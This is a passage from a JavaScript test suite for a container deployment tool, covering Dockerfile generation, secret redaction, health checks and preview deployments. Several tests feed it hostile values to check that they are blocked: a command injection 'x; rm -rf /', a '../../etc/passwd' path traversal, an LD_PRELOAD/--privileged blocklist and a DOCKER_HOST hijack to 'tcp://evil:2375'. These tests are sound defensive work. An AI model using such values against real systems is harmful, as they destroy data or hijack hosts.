  assert.ok(dfAstroSsr.includes('CMD ["node", "dist/server/entry.mjs"]') && dfAstroSsr.includes('HOST=0.0.0.0'));

  // Rust + inyección bloqueada en Cargo.toml
  const rustDir = fixture('rust-app', {
    'Cargo.toml': '[package]\nname = "hyper-api"\nversion = "0.1.0"\n',
    'src/main.rs': 'fn main() {}\n'
  });
  const sRust = await dm.detectStrategy(rustDir, {});
  assert.strictEqual(sRust.stack, 'rust');
  assert.strictEqual(sRust.rustBinary, 'hyper-api');
  const dfRust = dm.generateDockerfile({ ...sRust, secretNames: ['CARGO_REGISTRY_TOKEN'] });
  assert.ok(dfRust.includes('FROM rust:1.85-alpine AS build') && dfRust.includes('target=/usr/local/cargo/registry'));
  assert.ok(dfRust.includes('--mount=type=secret,id=CARGO_REGISTRY_TOKEN'));
  assert.ok(dfRust.includes('cp /app/target/release/hyper-api /app/server') && dfRust.includes('USER culkibo'));
  const evilRustDf = dm.generateDockerfile({ stack: 'rust', containerPort: 8080, rustBinary: 'x; rm -rf /' });
  assert.ok(!evilRustDf.includes('rm -rf'));

  // Deno + inyección bloqueada en denoEntry
  const denoDir = fixture('deno-app', {
    'deno.json': JSON.stringify({ tasks: { start: 'deno run server.ts' } }),
    'server.ts': 'Deno.serve(() => new Response("ok"));\n'
  });
  const sDeno = await dm.detectStrategy(denoDir, {});
  assert.strictEqual(sDeno.stack, 'deno');
  assert.strictEqual(sDeno.denoEntry, 'server.ts');
  const dfDeno = dm.generateDockerfile(sDeno);
  assert.ok(dfDeno.includes('FROM denoland/deno:alpine-') && dfDeno.includes('"server.ts"') && dfDeno.includes('USER culkibo'));
  assert.ok(dm.healthCommandFor(sDeno).startsWith('deno eval '));
  const evilDenoDf = dm.generateDockerfile({ stack: 'deno', containerPort: 8000, denoEntry: '../../etc/passwd.ts' });
  assert.ok(evilDenoDf.includes('"main.ts"') && !evilDenoDf.includes('etc/passwd'));

  // Python uv, Poetry y Django WSGI
  const uvDir = fixture('py-uv', {
    'pyproject.toml': '[project]\nname="api"\ndependencies=["fastapi","uvicorn"]\n',
    'uv.lock': 'version = 1\n',
    'main.py': 'app = None\n'
  });
  const sUv = await dm.detectStrategy(uvDir, {});
  assert.strictEqual(sUv.stack, 'python');
  assert.strictEqual(sUv.pythonPackageManager, 'uv');
  const dfUv = dm.generateDockerfile({ ...sUv, secretNames: ['UV_INDEX_URL'] });
  assert.ok(dfUv.includes('uv sync --frozen --no-dev') && dfUv.includes('--mount=type=secret,id=UV_INDEX_URL'));
  assert.ok(dfUv.includes('uvicorn'));

  const poetryDir = fixture('py-poetry', {
    'pyproject.toml': '[tool.poetry]\nname="web"\n[tool.poetry.dependencies]\ndjango="^5.1"\ngunicorn="^23.0"\n',
    'poetry.lock': '',
    'manage.py': '',
    'myproj/wsgi.py': 'application = None\n'
  });
  const sPoetry = await dm.detectStrategy(poetryDir, {});
  assert.strictEqual(sPoetry.pythonPackageManager, 'poetry');
  assert.deepStrictEqual(sPoetry.pythonStartCmd, ['gunicorn', '--bind', '0.0.0.0:8000', 'myproj.wsgi:application']);
  const dfPoetry = dm.generateDockerfile(sPoetry);
  assert.ok(dfPoetry.includes('poetry install --only main') && dfPoetry.includes('myproj.wsgi:application'));

  // PHP / Laravel (prevalece incluso con Vite auxiliar en package.json!)
  const laravelDir = fixture('laravel-app', {
    'composer.json': JSON.stringify({ require: { 'laravel/framework': '^11.0' } }),
    'artisan': '#!/usr/bin/env php\n',
    'package.json': JSON.stringify({ devDependencies: { vite: '6.0.0' }, scripts: { build: 'vite build' } })
  });
  const sPhp = await dm.detectStrategy(laravelDir, {});
  assert.strictEqual(sPhp.stack, 'php');
  assert.strictEqual(sPhp.isLaravel, true);
  assert.strictEqual(sPhp.phpDocRoot, 'public');
  const dfPhp = dm.generateDockerfile({ ...sPhp, secretNames: ['COMPOSER_AUTH'] });
  assert.ok(dfPhp.includes('dunglas/frankenphp') && dfPhp.includes('"/app/public"') && dfPhp.includes('--mount=type=secret,id=COMPOSER_AUTH'));

  // Elixir
  const exDir = fixture('elixir-app', {
    'mix.exs': 'defmodule Demo.MixProject do\n  def project, do: [app: :phoenix_demo, version: "1.0.0"]\nend\n'
  });
  const sEx = await dm.detectStrategy(exDir, {});
  assert.strictEqual(sEx.stack, 'elixir');
  assert.strictEqual(sEx.elixirApp, 'phoenix_demo');
  const dfEx = dm.generateDockerfile(sEx);
  assert.ok(dfEx.includes('mix release phoenix_demo') && dfEx.includes('"/app/bin/phoenix_demo"'));

  // Java Gradle & Maven
  const gradleDir = fixture('java-gradle', { 'build.gradle.kts': 'plugins { java }\n', 'gradlew': '#!/bin/sh\n' });
  const sGradle = await dm.detectStrategy(gradleDir, {});
  assert.strictEqual(sGradle.stack, 'java');
  assert.strictEqual(sGradle.javaBuildTool, 'gradle');
  assert.strictEqual(sGradle.javaHasWrapper, true);
  const dfGradle = dm.generateDockerfile(sGradle);
  assert.ok(dfGradle.includes('./gradlew build -x test') && dfGradle.includes('eclipse-temurin:21-jre-alpine'));

  const mavenDir = fixture('java-maven', { 'pom.xml': '<project></project>\n' });
  const sMaven = await dm.detectStrategy(mavenDir, {});
  assert.strictEqual(sMaven.stack, 'java');
  assert.strictEqual(sMaven.javaBuildTool, 'maven');
  const dfMaven = dm.generateDockerfile(sMaven);
  assert.ok(dfMaven.includes('mvn package -DskipTests') && dfMaven.includes('target=/root/.m2'));

  // Monorepo pnpm + Turborepo: conserva contexto raíz y filtra por paquete
  const monoDir = fixture('monorepo-turbo', {
    'package.json': JSON.stringify({ name: 'root', private: true, packageManager: 'pnpm@9.15.0', devDependencies: { turbo: '^2.3.0' } }),
    'pnpm-workspace.yaml': 'packages:\n  - "apps/*"\n  - "packages/*"\n',
    'pnpm-lock.yaml': 'lockfileVersion: 9.0\n',
    'turbo.json': JSON.stringify({ tasks: { build: { outputs: ['.next/**'] } } }),
    'apps/web/package.json': JSON.stringify({ name: '@acme/web', dependencies: { next: '15.0.0' }, scripts: { build: 'next build' } }),
    'apps/web/next.config.mjs': 'export default { output: "standalone" };\n'
  });
  const monoCtx = dm.detectMonorepoContext(monoDir, 'apps/web');
  assert.ok(monoCtx && monoCtx.isMonorepo === true);
  assert.strictEqual(monoCtx.workspaceTool, 'turbo');
  assert.strictEqual(monoCtx.workspacePackageName, '@acme/web');
  assert.strictEqual(monoCtx.packageManager, 'pnpm');

  const sMono = await dm.detectStrategy(monoDir, { baseDirectory: '/apps/web' });
  assert.strictEqual(sMono.stack, 'next');
  assert.strictEqual(sMono.workspacePath, 'apps/web');
  assert.strictEqual(sMono.workspaceTool, 'turbo');
  assert.strictEqual(sMono.packageManager, 'pnpm');
  const dfMono = dm.generateDockerfile(sMono);
  assert.ok(dfMono.includes('pnpm exec turbo run build --filter=@acme/web...'), 'Debe compilar con filtro Turborepo');
  assert.ok(dfMono.includes('/app/apps/web/.next/standalone'), 'Debe copiar artefacto standalone del workspace');
  assert.ok(dfMono.includes('CMD ["node", "apps/web/server.js"]'));

  // Monorepo Nx
  const nxDir = fixture('monorepo-nx', {
    'package.json': JSON.stringify({ name: 'nx-root', workspaces: ['apps/*'] }),
    'nx.json': '{}',
    'apps/api/package.json': JSON.stringify({ name: 'billing-api', dependencies: { express: '5.0.0' }, scripts: { build: 'tsc', start: 'node dist/index.js' } })
  });
  const sNx = await dm.detectStrategy(nxDir, { baseDirectory: 'apps/api' });
  assert.strictEqual(sNx.workspaceTool, 'nx');
  const dfNx = dm.generateDockerfile(sNx);
  assert.ok(dfNx.includes('npx nx build billing-api') && dfNx.includes('WORKDIR /app/apps/api'));

  console.log('  ✓ Stacks Railpack (Bun, Nuxt, SvelteKit, Astro SSR, Rust, Deno, uv/Poetry/Django, PHP/Laravel, Elixir, Java, Monorepo Turbo/Nx)');
}

// ---------------------------------------------------------------------------
// 4b. BuildKit --secret mounts & ejecución directa de runBuild() (0 fugas)
// ---------------------------------------------------------------------------
async function testBuildKitSecretsAndRunBuild() {
  const dm = sandbox();
  const input = { imageTag: 'culkibo/sec:b1', contextDir: '/srv/sec', dockerfile: 'Dockerfile' };

  // Determinismo con secretNames desordenados y bloqueo de nombres peligrosos / HOST_HIJACK_ENV_BLOCKLIST
  const a1 = dm.buildArgs({ ...input, secretNames: ['CARGO_REGISTRY_TOKEN', 'NPM_TOKEN', '--privileged', 'DOCKER_HOST', 'LD_PRELOAD'] });
  const a2 = dm.buildArgs({ ...input, secretNames: ['NPM_TOKEN', 'CARGO_REGISTRY_TOKEN'] });
  assert.deepStrictEqual(a1, a2, 'buildArgs con secretNames debe ser determinista');
  assert.ok(a1.includes('id=NPM_TOKEN,env=NPM_TOKEN'));
  assert.ok(a1.includes('id=CARGO_REGISTRY_TOKEN,env=CARGO_REGISTRY_TOKEN'));
  assert.ok(!a1.some((x) => x.includes('DOCKER_HOST') || x.includes('LD_PRELOAD') || x.includes('--privileged')));

  // Prueba directa de runBuild() SIN mockear runBuild:
  // comprueba Dockerfile generado, .dockerignore, DOCKER_BUILDKIT=1, secretos solo en env y redacción en logs/error.
  const ctx = fixture('runbuild-secrets', {
    'package.json': JSON.stringify({ name: 'priv-app', scripts: { start: 'node index.js' } }),
    'index.js': 'console.log("ok");\n'
  });
  const strategy = await dm.detectStrategy(ctx, {});
  const SUPER_SECRET = 'npm_SuperSecretToken_9988776655';
  let capturedArgs = null;
  let capturedEnv = null;
  dm.runDocker = async (args, opts) => {
    capturedArgs = args;
    capturedEnv = opts.env;
    if (opts.onLine) opts.onLine(`debug leaked=${SUPER_SECRET}`);
    return { code: 1, stdout: '', stderr: `ERR auth failed for ${SUPER_SECRET}` };
  };

  const dep = { id: 'dep_rb_1', projectId: 'proj_rb_sec', projectName: 'PrivApp', imageTag: 'culkibo/priv:b1', logLines: [] };
  const res = await dm.runBuild(dep, {
    strategy,
    contextDir: ctx,
    project: { id: 'proj_rb_sec', buildArgs: { PUBLIC_URL: 'https://x.test' }, buildSecrets: { NPM_TOKEN: SUPER_SECRET, DOCKER_HOST: 'tcp://evil:2375' } },
    opts: { buildTimeoutMs: 30000 },
    envVars: {}
  });

  assert.strictEqual(res.ok, false);
  assert.ok(capturedArgs.includes('--secret') && capturedArgs.includes('id=NPM_TOKEN,env=NPM_TOKEN'));
  assert.ok(!capturedArgs.join(' ').includes(SUPER_SECRET), 'El valor del secreto jamás puede aparecer en argv');
  assert.strictEqual(capturedEnv.DOCKER_BUILDKIT, '1');
  assert.strictEqual(capturedEnv.NPM_TOKEN, SUPER_SECRET, 'El valor del secreto viaja en env del hijo');
  assert.notStrictEqual(capturedEnv.DOCKER_HOST, 'tcp://evil:2375', 'HOST_HIJACK_ENV_BLOCKLIST impide secuestrar DOCKER_HOST');
  assert.ok(!res.error.includes(SUPER_SECRET), 'El error de build debe redactar el secreto BuildKit');
  assert.ok(dep.logLines.every((l) => !l.message.includes(SUPER_SECRET)), 'Ninguna línea de log debe filtrar el secreto BuildKit');

  const writtenDf = fs.readFileSync(path.join(ctx, '.culkibo', 'Dockerfile'), 'utf8');
  assert.ok(writtenDf.includes('--mount=type=secret,id=NPM_TOKEN'), 'Dockerfile generado debe montar el secreto BuildKit');
  assert.ok(!writtenDf.includes('ARG NPM_TOKEN') && !writtenDf.includes('ENV NPM_TOKEN'), 'Jamás escribir secreto como ARG/ENV');
  assert.ok(fs.existsSync(path.join(ctx, '.culkibo', 'Dockerfile.dockerignore')), 'Debe generar Dockerfile.dockerignore');

  // runArgs respeta healthStartPeriodSec y healthRetries configurables
  const rArgs = dm.runArgs({
    containerName: 'c_hp',
    imageTag: 'img:1',
    hostPort: 22100,
    containerPort: 3000,
    healthCmd: 'node -e "1"',
    healthStartPeriodSec: 45,
    healthRetries: 5
  });
  const joinedRun = rArgs.join(' ');
  assert.ok(joinedRun.includes('--health-start-period 45s'), 'Debe respetar healthStartPeriodSec');
  assert.ok(joinedRun.includes('--health-retries 5'), 'Debe respetar healthRetries');

  console.log('  ✓ BuildKit --secret + runBuild() real: determinista, 0 fugas en argv/capas/logs y --health-start-period');
}

// ---------------------------------------------------------------------------
// 5b. waitForHealth() con servidor HTTP real (Host real, 404/500, threshold, crash-loop y abort)
// ---------------------------------------------------------------------------
async function testWaitForHealthRealHttp() {
  const dm = sandbox();
  let mode = 'ok';
  let seenHost = null;
  let seqIdx = 0;
  const seqStatuses = [200, 500, 200, 200, 200];

  const srv = http.createServer((req, res) => {
    seenHost = req.headers.host || null;
    if (mode === 'not_found') {
      res.writeHead(404);
      res.end('missing');
      return;
    }
    if (mode === 'flaky_seq') {
      const code = seqStatuses[Math.min(seqIdx++, seqStatuses.length - 1)];
      res.writeHead(code);
      res.end(code === 200 ? 'ok' : 'err');
      return;
    }
    if (mode === 'boot_grace') {
      const code = seqIdx++ < 2 ? 503 : 200;
      res.writeHead(code);
      res.end(code === 200 ? 'ready' : 'booting');
      return;
    }
    if (mode === 'always_500') {
      res.writeHead(500);
      res.end('boom');
      return;
    }
    res.writeHead(200);
    res.end('ok');
  });
  await new Promise((resolve) => srv.listen(0, '127.0.0.1', () => resolve(undefined)));
  const addr = srv.address();
  const port = typeof addr === 'object' && addr ? addr.port : 0;

  try {
    // 1. Transmite cabecera Host REAL (supera limitación de fetch/undici)
    mode = 'ok';
    seenHost = null;
    const hHost = await dm.waitForHealth({
      hostPort: port,
      healthPath: '/up',
      hostHeader: 'vhost.ejemplo.com',
      timeoutMs: 3000,
      intervalMs: 50
    });
    assert.strictEqual(hHost.healthy, true);
    assert.strictEqual(seenHost, 'vhost.ejemplo.com', 'waitForHealth debe enviar la cabecera Host real por HTTP');

    // 2. `/` acepta 404 (<500), mientras ruta personalizada `/healthz` rechaza 404
    mode = 'not_found';
    const root404 = await dm.waitForHealth({ hostPort: port, healthPath: '/', timeoutMs: 1000, intervalMs: 50 });
    assert.strictEqual(root404.healthy, true);
    assert.strictEqual(root404.status, 404);

    const custom404 = await dm.waitForHealth({ hostPort: port, healthPath: '/healthz', timeoutMs: 250, intervalMs: 40 });
    assert.strictEqual(custom404.healthy, false);
    assert.ok(/404/.test(custom404.reason));

    // 3. healthyThreshold: 3 exige 3 respuestas sanas consecutivas (200, 500, 200, 200, 200 => 5 intentos)
    mode = 'flaky_seq';
    seqIdx = 0;
    const hThresh = await dm.waitForHealth({
      hostPort: port,
      healthPath: '/healthz',
      healthyThreshold: 3,
      timeoutMs: 4000,
      intervalMs: 30
    });
    assert.strictEqual(hThresh.healthy, true);
    assert.strictEqual(hThresh.consecutiveOk, 3);
    assert.strictEqual(hThresh.attempts, 5, 'Un 500 intermedio debe reiniciar el contador de healthyThreshold');

    // 4. Periodo de gracia de arranque: absorbe 503 iniciales mientras arranca
    mode = 'boot_grace';
    seqIdx = 0;
    const hGrace = await dm.waitForHealth({
      hostPort: port,
      healthPath: '/healthz',
      healthGraceMs: 400,
      timeoutMs: 2000,
      intervalMs: 30
    });
    assert.strictEqual(hGrace.healthy, true);
    assert.ok(hGrace.attempts >= 3);

    // 5. Fast-fail en crash-loop (State.Restarting=true) sin esperar al timeout
    mode = 'always_500';
    dm.runDocker = async () => ({ code: 0, stdout: 'true|true|2\n', stderr: '' });
    const t0 = Date.now();
    const hCrash = await dm.waitForHealth({
      hostPort: port,
      healthPath: '/healthz',
      containerName: 'c_crash',
      timeoutMs: 15000,
      intervalMs: 50
    });
    assert.strictEqual(hCrash.healthy, false);
    assert.ok(/bucle de reinicios/.test(hCrash.reason));
    assert.ok(Date.now() - t0 < 2000, 'Crash-loop debe abortar de inmediato sin consumir 15 s');

    // 6. AbortSignal cancela de inmediato
    const ac = new AbortController();
    ac.abort();
    const hAborted = await dm.waitForHealth({
      hostPort: port,
      healthPath: '/healthz',
      timeoutMs: 5000,
      intervalMs: 50,
      signal: ac.signal
    });
    assert.strictEqual(hAborted.healthy, false);
    assert.strictEqual(hAborted.aborted, true);
  } finally {
    await new Promise((resolve) => srv.close(() => resolve(undefined)));
  }

  console.log('  ✓ waitForHealth HTTP real: cabecera Host real, 404 vs ruta custom, healthyThreshold, gracia, crash-loop y abort');
}

// ---------------------------------------------------------------------------
// 8b. cancelDeploy, semáforo de builds, hooks pre/post (rollback) y pruneOldReleases
// ---------------------------------------------------------------------------
async function testCancelSemaphoreHooksAndPrune() {
  // 1. Semáforo global de concurrencia + liberación limpia al abortar en cola
  const dmSem = sandbox();
  dmSem.maxConcurrentBuilds = 1;
  const s1 = await dmSem.acquireBuildSlot('p1', 'd1');
  assert.strictEqual(s1.waited, false);
  assert.strictEqual(dmSem._activeBuilds, 1);

  const acQueue = new AbortController();
  const queuedPromise = dmSem.acquireBuildSlot('p2', 'd2', { signal: acQueue.signal });
  assert.strictEqual(dmSem._buildQueue.length, 1);
  acQueue.abort();
  await assert.rejects(() => queuedPromise, (e) => e && e.code === 'DEPLOY_CANCELLED');
  assert.strictEqual(dmSem._buildQueue.length, 0, 'Un build abortado en cola no debe dejar entrada huérfana');
  dmSem.releaseBuildSlot();
  assert.strictEqual(dmSem._activeBuilds, 0, 'El slot debe volver exactamente a 0');

  // 2. cancelDeploy(): 404 en reposo, 409 en promoción atómica, y cancelación limpia durante build
  const dmCancel = sandbox();
  assert.strictEqual(dmCancel.cancelDeploy('inexistente').status, 404);

  const ctxCancel = fixture('cancel-app', { 'Dockerfile': 'FROM alpine\nEXPOSE 3000\n' });
  let buildSignalSeen = null;
  let releaseBuild;
  dmCancel.detectStrategy = async () => ({
    builder: 'dockerfile', stack: 'dockerfile', dockerfile: 'Dockerfile',
    containerPort: 3000, healthPath: '/', injectHealthcheck: false, reason: 'mock'
  });
  dmCancel.runBuild = async (_dep, { signal }) => {
    buildSignalSeen = signal;
    await new Promise((resolve) => {
      releaseBuild = resolve;
      signal.addEventListener('abort', () => resolve(undefined), { once: true });
    });
    return { ok: false, aborted: true, error: 'Construcción cancelada' };
  };
  const cancelDepPromise = dmCancel.deploy({ id: 'proj_cancel', name: 'Cancel', domains: [], envVars: {} }, { contextDir: ctxCancel });
  await new Promise((r) => setTimeout(r, 20));
  const cancelRes = dmCancel.cancelDeploy('proj_cancel', { reason: 'Stop now' });
  assert.strictEqual(cancelRes.cancelled, true);
  assert.strictEqual(cancelRes.stage, 'construyendo');
  if (releaseBuild) releaseBuild();
  const cancelDep = await cancelDepPromise;
  assert.strictEqual(cancelDep.status, 'cancelado');
  assert.strictEqual(buildSignalSeen.aborted, true);

  // 409 si está en promoción atómica
  dmCancel._activeOps.set('proj_promo', { deploymentId: 'd_p', stage: 'promocionando', controller: new AbortController(), children: new Set(), containerName: null });
  const promoCancel = dmCancel.cancelDeploy('proj_promo');
  assert.strictEqual(promoCancel.cancelled, false);
  assert.strictEqual(promoCancel.status, 409);
  dmCancel._activeOps.delete('proj_promo');

  // 3. Hook pre-deploy fallido aborta ANTES de arrancar el contenedor + post-deploy fallido con rollback automático
  const dmHooks = sandbox();
  const ctxHooks = fixture('hooks-app', { 'Dockerfile': 'FROM alpine\nEXPOSE 3000\n' });
  let runCalled = false;
  dmHooks.detectStrategy = async () => ({
    builder: 'dockerfile', stack: 'dockerfile', dockerfile: 'Dockerfile',
    containerPort: 3000, healthPath: '/', injectHealthcheck: false, reason: 'mock'
  });
  dmHooks.runBuild = async () => ({ ok: true });
  dmHooks.ensureNetwork = async () => true;
  dmHooks.findFreePort = async () => 24101;
  dmHooks.resolveUpstream = async ({ containerName, containerPort }) => ({ dial: `${containerName}:${containerPort}`, mode: 'network' });
  dmHooks.waitForHealth = async () => ({ healthy: true, attempts: 1, status: 200 });
  dmHooks.switchRoute = async (dep) => { dep.routeSwitched = true; return { ok: true }; };
  dmHooks.runDocker = async (args) => {
    if (args[0] === 'run') runCalled = true;
    if (args[0] === 'start' && args[1] === '-a') return { code: 1, stdout: '', stderr: 'migration failed' };
    return { code: 0, stdout: '', stderr: '' };
  };

  const preFail = await dmHooks.deploy({
    id: 'proj_hooks', name: 'Hooks', domains: ['hooks.test'], envVars: {},
    preDeployCommand: 'npx prisma migrate deploy'
  }, { contextDir: ctxHooks });
  assert.strictEqual(preFail.status, 'fallido');
  assert.strictEqual(runCalled, false, 'Un pre-deploy fallido jamás debe arrancar el contenedor nuevo');

  // Post-deploy fallido con postDeployFailPolicy='rollback' revierte dentro del lock
  let rollbackTriggered = false;
  dmHooks.store['proj_hooks_post'] = {
    current: {
      deploymentId: 'dep_v1', imageTag: 'culkibo/hp:v1', containerName: 'culkibo_hp_v1',
      hostPort: 24100, containerPort: 3000, upstream: 'culkibo_hp_v1:3000',
      hostnames: ['hp.test'], healthPath: '/'
    },
    previous: null,
    history: []
  };
  dmHooks.runDocker = async (args) => {
    if (args[0] === 'exec') return { code: 1, stdout: '', stderr: 'smoke hook boom' };
    if (args[0] === 'inspect') return { code: 0, stdout: 'true\n', stderr: '' };
    return { code: 0, stdout: '', stderr: '' };
  };
  const origRb = dmHooks._rollback.bind(dmHooks);
  dmHooks._rollback = async (pid, o) => { rollbackTriggered = true; return origRb(pid, o); };
  const postFail = await dmHooks.deploy({
    id: 'proj_hooks_post', name: 'HooksPost', domains: ['hp.test'], envVars: {},
    postDeployCommand: 'node scripts/verify.js',
    postDeployFailPolicy: 'rollback'
  }, { contextDir: ctxHooks, drainTimeoutMs: 5, stopGraceSeconds: 0 });
  await dmHooks.awaitDrain('proj_hooks_post');
  assert.strictEqual(postFail.status, 'fallido');
  assert.strictEqual(rollbackTriggered, true, 'postDeployFailPolicy=rollback debe revertir inmediatamente');
  assert.strictEqual(dmHooks.store['proj_hooks_post'].current.containerName, 'culkibo_hp_v1', 'La versión estable debe restaurarse como current');

  // 4. pruneOldReleases() protege current, previous, inFlightContainers, drenajes, previews y hooks
  const dmPrune = sandbox();
  dmPrune.store['proj_pr'] = {
    current: { containerName: 'c_cur', imageTag: 'culkibo/proj_pr:v3' },
    previous: { containerName: 'c_prev', imageTag: 'culkibo/proj_pr:v2' },
    history: [
      { imageTag: 'culkibo/proj_pr:v3', status: 'activo' },
      { imageTag: 'culkibo/proj_pr:v2', status: 'activo' },
      { imageTag: 'culkibo/proj_pr:v1', status: 'activo' }
    ]
  };
  dmPrune.inFlightContainers.add('c_inflight');
  dmPrune._drainTimers.set('c_draining', { projectId: 'proj_pr', timer: null, resolve: () => {} });
  const rmContainers = [];
  const rmImages = [];
  dmPrune.runDocker = async (args) => {
    if (args[0] === 'ps' && args.some((a) => a.includes('com.culkibo.project_id='))) {
      return {
        code: 0,
        stdout: [
          'c_cur||',
          'c_prev||',
          'c_inflight||',
          'c_draining||',
          'c_preview|true|',
          'c_hook||pre_deploy',
          'c_old_stale||'
        ].join('\n'),
        stderr: ''
      };
    }
    if (args[0] === 'ps') return { code: 0, stdout: '', stderr: '' };
    if (args[0] === 'images' && args.some((a) => a.includes('label='))) {
      return {
        code: 0,
        stdout: ['culkibo/proj_pr:v3', 'culkibo/proj_pr:v2', 'culkibo/proj_pr:v1', 'culkibo/prev-proj_pr:pr-9'].join('\n'),
        stderr: ''
      };
    }
    if (args[0] === 'images') return { code: 0, stdout: '', stderr: '' };
    if (args[0] === 'rm') rmContainers.push(args[args.length - 1]);
    if (args[0] === 'rmi') rmImages.push(args[args.length - 1]);
    return { code: 0, stdout: '', stderr: '' };
  };
  const pruned = await dmPrune.pruneOldReleases('proj_pr', 2);
  dmPrune._drainTimers.delete('c_draining');
  assert.deepStrictEqual(rmContainers, ['c_old_stale'], 'Solo debe borrar contenedores obsoletos y proteger previews/hooks/inFlight/draining');
  assert.deepStrictEqual(rmImages, ['culkibo/proj_pr:v1'], 'Debe conservar current/previous y jamás tocar imágenes culkibo/prev-*');
  assert.deepStrictEqual(pruned.removed, ['c_old_stale']);

  console.log('  ✓ cancelDeploy, semáforo de builds, hooks pre/post con auto-rollback y pruneOldReleases');
}

// ---------------------------------------------------------------------------
// 10b. repoSync.sync() respeta AbortSignal cooperativamente
// ---------------------------------------------------------------------------
async function testRepoSyncAbortSignal() {
  const ac = new AbortController();
  ac.abort();
  const res = await repoSync.sync(
    { id: 'proj_sync_abort', gitRepo: 'https://github.com/example/repo.git', gitBranch: 'main' },
    { signal: ac.signal }
  );
  assert.strictEqual(res.ok, false);
  assert.strictEqual(res.aborted, true, 'repoSync.sync() debe devolver aborted=true al recibir un AbortSignal abortado');

  const gitRes = await repoSync.helpers.runGit(['--version'], { signal: ac.signal });
  assert.strictEqual(gitRes.code, -3);
  assert.strictEqual(gitRes.aborted, true);

  console.log('  ✓ repoSync: cancelación cooperativa limpia con AbortSignal');
}

// ---------------------------------------------------------------------------
// 10c. PreviewManager real: PR close mid-build (0 huérfanos), supersede, envVars & TTL
// ---------------------------------------------------------------------------
async function testPreviewLifecycleAbortSupersedeAndEnv() {
  const pmDir = path.join(tmpRoot, 'pm-isolated');
  fs.mkdirSync(pmDir, { recursive: true });
  const pm = new PreviewManager({ dataDir: pmDir });
  const dm = sandbox();
  const previewRoutes = new Map();
  const mockIngress = { previewRoutes, reconcile: async () => ({ applied: true }) };
  pm._getDeployManager = () => dm;
  pm._getIngressManager = () => mockIngress;

  // 1. Validación REAL de baseDomain (no el falso positivo de Proyecto inválido)
  await assert.rejects(
    () => pm.deployPreview(
      { id: 'p_dom', name: 'Demo', previewDeployments: { enabled: true, baseDomain: 'not valid domain!' } },
      { branch: 'feat/x' }
    ),
    /RFC-1123/i,
    'Debe rechazar baseDomain no RFC-1123 con mensaje específico'
  );

  // 2. Scoped previewDeployments.envVars + buildSecrets + signal + phaseTimings
  let seenBuildSecrets = null;
  let seenBuildSignal = null;
  let seenRunEnv = null;
  const removedContainers = [];
  const mockRepoSync = {
    sync: async (_proj, { targetDir, commit }) => {
      fs.mkdirSync(targetDir, { recursive: true });
      fs.writeFileSync(path.join(targetDir, 'index.html'), '<h1>prev</h1>', 'utf8');
      return { ok: true, action: 'clonado', commit: commit || 'aaaa111', shortCommit: (commit || 'aaaa111').slice(0, 7) };
    }
  };
  pm._getRepoSync = () => mockRepoSync;

  dm.ensureNetwork = async () => true;
  dm.findFreePort = async () => 24301;
  dm.resolveUpstream = async ({ containerName, containerPort }) => ({ dial: `${containerName}:${containerPort}`, mode: 'network' });
  dm.waitForHealth = async () => ({ healthy: true, attempts: 1, status: 200 });
  dm.runBuild = async (_dep, { project, signal }) => {
    seenBuildSecrets = project.buildSecrets || null;
    seenBuildSignal = signal;
    return { ok: true };
  };
  dm.runDocker = async (args, opts = {}) => {
    if (args[0] === 'run') seenRunEnv = opts.env;
    if (args[0] === 'rm') removedContainers.push(args[args.length - 1]);
    return { code: 0, stdout: '', stderr: '' };
  };

  const baseProject = {
    id: 'proj_prev_1',
    name: 'Shop',
    envVars: { STRIPE_KEY: 'sk_live_prod_secret', APP_MODE: 'prod' },
    buildSecrets: { NPM_TOKEN: 'npm_secret_preview_12345' },
    previewDeployments: {
      enabled: true,
      baseDomain: 'previews.shop.test',
      envVars: { STRIPE_KEY: 'sk_test_preview_override', PREVIEW_FLAG: 'on' }
    }
  };

  const p1 = await pm.deployPreview(baseProject, { prNumber: 42, branch: 'feat/checkout', commit: '1111aaa' });
  assert.strictEqual(p1.status, 'active');
  assert.strictEqual(p1.hostname, 'pr-42-shop.previews.shop.test');
  assert.strictEqual(seenRunEnv.STRIPE_KEY, 'sk_test_preview_override', 'previewDeployments.envVars debe sobreescribir envVars de producción');
  assert.strictEqual(seenRunEnv.PREVIEW_FLAG, 'on');
  assert.strictEqual(seenRunEnv.CULKIBO_PREVIEW, '1');
  assert.strictEqual(seenBuildSecrets && seenBuildSecrets.NPM_TOKEN, 'npm_secret_preview_12345', 'buildSecrets debe pasar a runBuild');
  assert.ok(seenBuildSignal instanceof AbortSignal, 'Debe pasar AbortSignal a runBuild');
  assert.ok(p1.phaseTimings && typeof p1.phaseTimings.build.durationMs === 'number', 'Debe registrar phaseTimings en preview');
  assert.ok(previewRoutes.has('proj_prev_1_pr-42'));

  // 3. PR cerrada a mitad del build -> aborta sin huérfanos ni ruta fantasma
  let releaseSlowBuild;
  let slowSignal;
  dm.runBuild = async (_dep, { signal }) => {
    slowSignal = signal;
    await new Promise((resolve) => {
      releaseSlowBuild = resolve;
      signal.addEventListener('abort', () => resolve(undefined), { once: true });
    });
    return { ok: false, aborted: true, error: 'Construcción cancelada' };
  };
  const closeRacePromise = pm.deployPreview(baseProject, { prNumber: 99, branch: 'feat/closed-pr', commit: '2222bbb' });
  await new Promise((r) => setTimeout(r, 25));
  const destroyRes = await pm.destroyPreview('proj_prev_1', { prNumber: 99 });
  assert.strictEqual(destroyRes.removed, true);
  assert.strictEqual(destroyRes.abortedBuild, true);
  assert.strictEqual(slowSignal.aborted, true, 'destroyPreview debe abortar el build en vuelo');
  if (releaseSlowBuild) releaseSlowBuild();
  await assert.rejects(() => closeRacePromise, (e) => e && e.code === 'PREVIEW_ABORTED');
  assert.strictEqual(pm.get('proj_prev_1', 'pr-99'), null, 'No debe quedar registro fantasma tras cerrar PR en vuelo');
  assert.strictEqual(previewRoutes.has('proj_prev_1_pr-99'), false, 'No debe quedar ruta Caddy huérfana');

  // 4. Push rápido (supersede=true por defecto): aborta commit viejo y despliega commit nuevo sin 409
  let buildCounter = 0;
  let firstAborted = false;
  dm.runBuild = async (_dep, { signal }) => {
    const myIdx = ++buildCounter;
    if (myIdx === 1) {
      await new Promise((resolve) => {
        signal.addEventListener('abort', () => { firstAborted = true; resolve(undefined); }, { once: true });
      });
      return { ok: false, aborted: true, error: 'Construcción cancelada' };
    }
    return { ok: true };
  };
  const push1 = pm.deployPreview(baseProject, { prNumber: 55, branch: 'feat/fast', commit: 'aaaa001' });
  await new Promise((r) => setTimeout(r, 25));
  const push2 = pm.deployPreview(baseProject, { prNumber: 55, branch: 'feat/fast', commit: 'bbbb002' });
